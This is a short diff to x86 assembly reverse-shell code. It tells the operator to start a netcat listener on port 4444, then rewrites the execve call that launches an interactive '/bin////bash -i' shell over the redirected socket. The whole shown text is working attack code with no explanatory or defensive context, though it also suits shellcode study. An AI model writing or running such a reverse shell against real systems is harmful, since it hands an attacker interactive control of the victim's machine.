@@ -10,6 +10,11 @@ section .data
 ncmsg db "You need to launch nc -nlvp 4444", 0xA
 len equ $ - ncmsg
 
+arg0 db "/bin////bash", 0
+arg1 db "-i", 0
+argv dd arg0, arg1, 0
+envp dd 0
+
 timeval:
 tv_sec dd 0 ; seconds
 tv_nsec dd 0 ; nanoseconds
@@ -87,15 +92,7 @@ mov cl, 0x2
 int 0x80
 
 mov al, 0xB ; execve syscall
-
-xor ebx, ebx
-push ebx        ; NULL
-push 0x68736162 ; hsab
-push 0x2F2F2F2F ; ////
-push 0x6E69622F ; nib/
-
-mov ebx, esp
-
-xor ecx, ecx
-xor edx, edx
+mov ebx, arg0
+mov ecx, argv
+mov edx, envp
 int 0x80
